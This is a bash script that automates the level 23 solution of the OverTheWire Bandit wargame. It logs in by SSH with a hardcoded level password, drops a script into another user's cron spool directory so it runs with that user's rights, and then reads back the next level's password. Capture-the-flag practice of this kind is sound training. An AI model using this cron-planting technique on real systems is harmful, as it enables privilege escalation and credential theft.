#!/bin/bash

level=23
bandit_host="bandit.labs.overthewire.org"
bandit_user="bandit$level"
bandit_pass="jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n"
temp_dir="/tmp/mytwentythreefolder"

# Get env ready
command1="mkdir $temp_dir 2>/dev/null || :"
sshpass -p "$bandit_pass" ssh $bandit_user@$bandit_host -p 2220 "$command1"

# PUSH cron script
sshpass -p "$bandit_pass" scp -P 2220 ./helpers/23_cron_script.sh $bandit_user@$bandit_host:$temp_dir/cron.sh

# Get pass
command2="touch $temp_dir/24_pass.txt && chmod 666 $temp_dir/24_pass.txt && chmod 777 $temp_dir/cron.sh && cp $temp_dir/cron.sh /var/spool/bandit24/cron.sh && sleep 61 && cat $temp_dir/24_pass.txt"

next_bandit_pass=$(sshpass -p "$bandit_pass" ssh $bandit_user@$bandit_host -p 2220 "$command2")
next_bandit_pass=$(echo $next_bandit_pass | awk '{print $NF}')

echo "Bandit$(($level+1)) Password: $next_bandit_pass"